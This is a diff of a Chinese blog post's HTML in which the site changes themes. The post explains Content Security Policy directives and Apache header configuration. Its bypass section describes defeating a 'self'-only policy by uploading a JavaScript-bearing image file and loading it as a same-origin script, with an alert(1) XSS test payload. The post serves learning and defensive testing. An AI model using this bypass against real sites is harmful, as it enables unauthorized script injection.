@@ -1,400 +1,428 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
+<html lang="zh-Hans">
 
 
-
-  
-
-
-<html class="theme-next gemini use-motion" lang="zh-Hans">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="浏览器安全策略," />
-
-
-
-
-
-
-
-
-
-
-<meta name="description" content="内容安全策略 CSP百度百科概念：  CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容 直白的说就是通过该浏览器扩展 进行 加载资源脚本的黑白名单限制；实现和执行均由浏览器完成 功能效果主要用来防注入脚本（">
-<meta name="keywords" content="浏览器安全策略">
-<meta property="og:type" content="article">
-<meta property="og:title" content="安全策略-csp理解与学习">
-<meta property="og:url" content="http://yoursite.com/2019/01/10/安全策略/csp/index.html">
-<meta property="og:site_name" content="吾善养浩然气">
-<meta property="og:description" content="内容安全策略 CSP百度百科概念：  CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容 直白的说就是通过该浏览器扩展 进行 加载资源脚本的黑白名单限制；实现和执行均由浏览器完成 功能效果主要用来防注入脚本（">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-07-21T04:44:08.691Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="安全策略-csp理解与学习">
-<meta name="twitter:description" content="内容安全策略 CSP百度百科概念：  CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容 直白的说就是通过该浏览器扩展 进行 加载资源脚本的黑白名单限制；实现和执行均由浏览器完成 功能效果主要用来防注入脚本（">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2019/01/10/安全策略/csp/"/>
-
-
-
-
-
-  <title>安全策略-csp理解与学习 | 吾善养浩然气</title>
-  
-
-
-
-
-
-
-
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-  
+    <meta charset="utf-8">
+    <meta name="keywords" content="安全策略-csp理解与学习, 止于唇齿，掩于岁月">
+    <meta name="description" content="内容安全策略 CSP百度百科概念： 
+CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>安全策略-csp理解与学习 | 吾善养浩然气</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">吾善养浩然气</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
     
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
     
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>Friends</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="Search"></i>
+        </a>
+    </li>
+</ul>
 
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">吾善养浩然气</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">吾善养浩然气</div>
+        <div class="logo-desc">
+            
+            纯净水@流云-自留地
+            
+        </div>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
 
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                Friends
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
 </div>
 
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-主页">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            主页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-关于">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-标签">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-分类">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-归档">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/10/安全策略/csp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="blackj liuyun">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="吾善养浩然气">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">安全策略-csp理解与学习</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-10T02:11:33+08:00">
-                2019-01-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/浏览器安全策略/" itemprop="url" rel="index">
-                    <span itemprop="name">浏览器安全策略</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/浏览器安全策略/csp/" itemprop="url" rel="index">
-                    <span itemprop="name">csp</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  3k
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  12
-                </span>
-              
-            </div>
-          
-
-          
-
         </div>
-      </header>
-    
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        安全策略-csp理解与学习
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
 
-      
-      
+    #articleContent :focus {
+        outline: none;
+    }
 
-      
-        <h1 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略 CSP"></a>内容安全策略 CSP</h1><p>百度百科概念： </p>
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/浏览器安全策略/" target="_blank">
+                                <span class="chip bg-color">浏览器安全策略</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/浏览器安全策略/" class="post-category" target="_blank">
+                                浏览器安全策略
+                            </a>
+                        
+                            <a href="/categories/浏览器安全策略/csp/" class="post-category" target="_blank">
+                                csp
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2019-01-10
+                </div>
+
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略 CSP"></a>内容安全策略 CSP</h1><p>百度百科概念： </p>
 <p>CSP指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容</p>
 <p>直白的说就是通过该浏览器扩展 进行 加载资源脚本的黑白名单限制；实现和执行均由浏览器完成</p>
 <h4 id="功能效果"><a href="#功能效果" class="headerlink" title="功能效果"></a>功能效果</h4><p>主要用来防注入脚本（比如 xss 加载其他域下的js；广告注入h5页面、运营商的http劫持）图片、iframe、fton、style等等可能的远程的资源</p>
@@ -404,8 +432,31 @@
 </ul>
 <h5 id="CSP和同源策略"><a href="#CSP和同源策略" class="headerlink" title="CSP和同源策略"></a>CSP和同源策略</h5><p>在同源策略中 一个页面的资源只能从与之同源的服务器获取，不能从其他域获取；但因此也影响了灵活性，CSP相对来说 可以跨域获取资源，又能防止恶意代码。</p>
 <h5 id="使用方式："><a href="#使用方式：" class="headerlink" title="使用方式："></a>使用方式：</h5><h6 id="要素"><a href="#要素" class="headerlink" title="要素"></a>要素</h6><p>CSP域：允许使用CSP的规则</p>
-<p>CSP指令集：允许白名单的内容规则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">示例</span><br><span class="line"></span><br><span class="line">default-src &apos;self&apos;;   </span><br><span class="line"></span><br><span class="line">只允许同源下的资源</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">script-src &apos;self&apos;;     </span><br><span class="line"></span><br><span class="line">只允许同源下的js</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">script-src &apos;self&apos; www.google-analytics.com ajax.googleapis.com;</span><br><span class="line"></span><br><span class="line">允许同源以及两个地址下的js加载</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">default-src &apos;none&apos;; script-src &apos;self&apos;; connect-src &apos;self&apos;; img-src &apos;self&apos;; style-src &apos;self&apos;;</span><br><span class="line"></span><br><span class="line">多个资源时,后面的会覆盖前面的</span><br></pre></td></tr></table></figure></p>
-<ul>
+<p>CSP指令集：允许白名单的内容规则</p>
+<pre><code>示例
+
+default-src &#39;self&#39;;   
+
+只允许同源下的资源
+
+
+
+script-src &#39;self&#39;;     
+
+只允许同源下的js
+
+
+
+script-src &#39;self&#39; www.google-analytics.com ajax.googleapis.com;
+
+允许同源以及两个地址下的js加载
+
+
+
+default-src &#39;none&#39;; script-src &#39;self&#39;; connect-src &#39;self&#39;; img-src &#39;self&#39;; style-src &#39;self&#39;;
+
+多个资源时,后面的会覆盖前面的
+</code></pre><ul>
 <li>常见csp策略</li>
 </ul>
 <table>
@@ -562,24 +613,41 @@
 </tr>
 </tbody>
 </table>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">限制所有的外部资源，都只能从当前域名加载</span><br><span class="line">Content-Security-Policy: default-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
-<p>可以由http header和html来指定,启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
-<h5 id="http-header"><a href="#http-header" class="headerlink" title="http header"></a>http header</h5><p>在服务端的响应包的header中展示 内容均来自于应用自己域，不涉及子域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src&apos;self&apos;</span><br></pre></td></tr></table></figure></p>
-<h5 id="html中通过meta来限制"><a href="#html中通过meta来限制" class="headerlink" title="html中通过meta来限制"></a>html中通过meta来限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="构建一下csp-来个例子"><a href="#构建一下csp-来个例子" class="headerlink" title="构建一下csp 来个例子"></a>构建一下csp 来个例子</h4><h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>首先要在配置文件中加载mod_headers.so模块，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  a2enmod headers</span><br></pre></td></tr></table></figure></p>
-<p>在对应的配置文件中，我用的apache2.conf进行配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule headers_module modules/mod_headers.so</span><br></pre></td></tr></table></figure>
-<p>然后可以添加相关规则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header set Content-Security-Policy &quot;default-src &apos;self&apos;;&quot;</span><br></pre></td></tr></table></figure></p>
-<h5 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h5><h6 id="1-文件上传绕过-只允许加载当前域"><a href="#1-文件上传绕过-只允许加载当前域" class="headerlink" title="1 文件上传绕过  只允许加载当前域"></a>1 文件上传绕过  只允许加载当前域</h6><p>最常见规则如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &quot;);</span><br></pre></td></tr></table></figure></p>
-<p>针对这种方式，通常使用方法是 找一个文件上传点，上传一个文件内容为js的图片<br>说到这里 注意一下，浏览器对一个文件做解析/下载 处理的,并不是文件的后缀名<br>而是服务器返回的mimeType,如果在服务端没有定义的类型，即通俗的mimes.type中没有定义，即没有返回content-type<br>则在apache服务器中会默认以html格式解析（在nginx服务器中会以octet-stream，直接下载，这里可以使用svg后缀触发svg标签。条件允许的话），所以在遇到上传黑名单的时候，可以试试xx类似的。</p>
-<p>测试过程中 一来就折戟沉沙，头大，使用 该规则后，简单测试 xx文件后缀，直接嵌入script标签，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>竟然没用，一顿瞎操作后才确定，是因为制定了csp规则的问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &apos;self&apos;; 或者 default-src &apos;self&apos;</span><br></pre></td></tr></table></figure></p>
-<p>要允许内联的js执行，即添加 “unsafe-inline”</p>
+<pre><code>限制所有的外部资源，都只能从当前域名加载
+Content-Security-Policy: default-src &#39;self&#39; 
+</code></pre><p>可以由http header和html来指定,启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
+<h5 id="http-header"><a href="#http-header" class="headerlink" title="http header"></a>http header</h5><p>在服务端的响应包的header中展示 内容均来自于应用自己域，不涉及子域</p>
+<pre><code>Content-Security-Policy:default-src&#39;self&#39;
+</code></pre><h5 id="html中通过meta来限制"><a href="#html中通过meta来限制" class="headerlink" title="html中通过meta来限制"></a>html中通过meta来限制</h5><pre><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;
+</code></pre><h4 id="构建一下csp-来个例子"><a href="#构建一下csp-来个例子" class="headerlink" title="构建一下csp 来个例子"></a>构建一下csp 来个例子</h4><h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p>首先要在配置文件中加载mod_headers.so模块，</p>
+<pre><code>sudo  a2enmod headers
+</code></pre><p>在对应的配置文件中，我用的apache2.conf进行配置</p>
+<pre><code>LoadModule headers_module modules/mod_headers.so
+</code></pre><p>然后可以添加相关规则</p>
+<pre><code>Header set Content-Security-Policy &quot;default-src &#39;self&#39;;&quot;
+</code></pre><h5 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h5><h6 id="1-文件上传绕过-只允许加载当前域"><a href="#1-文件上传绕过-只允许加载当前域" class="headerlink" title="1 文件上传绕过  只允许加载当前域"></a>1 文件上传绕过  只允许加载当前域</h6><p>最常见规则如下：</p>
+<pre><code>header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &quot;); 
+</code></pre><p>针对这种方式，通常使用方法是 找一个文件上传点，上传一个文件内容为js的图片<br>说到这里 注意一下，浏览器对一个文件做解析/下载 处理的,并不是文件的后缀名<br>而是服务器返回的mimeType,如果在服务端没有定义的类型，即通俗的mimes.type中没有定义，即没有返回content-type<br>则在apache服务器中会默认以html格式解析（在nginx服务器中会以octet-stream，直接下载，这里可以使用svg后缀触发svg标签。条件允许的话），所以在遇到上传黑名单的时候，可以试试xx类似的。</p>
+<p>测试过程中 一来就折戟沉沙，头大，使用 该规则后，简单测试 xx文件后缀，直接嵌入script标签，</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>竟然没用，一顿瞎操作后才确定，是因为制定了csp规则的问题。</p>
+<pre><code>script-src &#39;self&#39;; 或者 default-src &#39;self&#39;
+</code></pre><p>要允许内联的js执行，即添加 “unsafe-inline”</p>
 <ul>
 <li>不允许内联时 测试的时候直接alert是没法触发的，所以在常规渗透测试的时候要注意，这个时候用 script src 这类引用是可以的，引用上传的同域js 执行。</li>
 </ul>
